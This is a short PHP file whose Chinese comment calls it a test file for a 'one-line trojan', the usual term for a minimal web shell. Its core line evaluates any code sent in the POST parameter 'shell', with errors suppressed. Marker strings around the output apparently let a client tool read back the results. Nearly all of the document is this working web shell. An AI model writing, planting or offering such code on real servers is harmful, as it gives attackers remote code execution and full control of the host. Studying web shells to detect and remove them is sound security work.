<!-- 用于测试一句话木马使用的测试文件 -->
<?php
echo 'joker';
// 定义一个变量 a 接收执行结果
$a = @eval($_POST["shell"]);
// 打印执行结果
echo $a;
echo 'jokerend';
$b = @eval("if (1==1) { echo 'Hello world'; }");
echo $b;
?>